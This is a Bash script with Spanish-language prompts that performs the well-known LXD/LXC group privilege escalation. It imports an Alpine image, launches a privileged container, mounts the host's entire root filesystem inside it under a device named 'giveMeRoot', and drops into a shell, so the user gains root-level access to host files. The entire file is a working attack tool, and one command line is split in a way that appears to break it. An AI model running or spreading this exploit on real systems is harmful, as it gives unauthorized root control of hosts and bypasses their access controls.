#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Saliendo...\n${endColour}"
	tput cnorm; exit 0
}

function helpPanel(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Uso:${endColour}"
	echo -e "\t${blueColour}[-f]${endColour}${redColour} Archivo:${endColour}"
	echo -e "\t${blueColour}[-h]${endColour}${redColour} Mostrar este panel de ayuda${endColour}\n"
	exit 1
}

function cleanup(){
	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Borrando contenedor...${endColour}"
	lxc stop privesc && lxc delete privesc && lxc image delete alpine
	echo -e "${greenColour} [V]${endColour}"
	tput cnorm
}

function createContainer(){
	lxc image import $filename --alias alpine && lxd init --auto
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Listando Imagenes...${endColour}\n" && lxc image list
	lxc init alpine privesc -c security.privileged=true
	lxc config device add privesc giveMeRoot disk source=/ path=
	/mnt/root recursive=true
	lxc start privesc
	lxc exec privesc sh
	cleanup
}

declare -i parameter_enabled=0; while getopts ":f:h:" arg; do
	case $arg in 
		f) filename=$OPTARG && let parameter_enabled+=1;;
		h) helpPanel;;
	esac
done

if [ $parameter_enabled -ne 1 ]; then
	helpPanel
else
	tput civis
	createContainer
fi
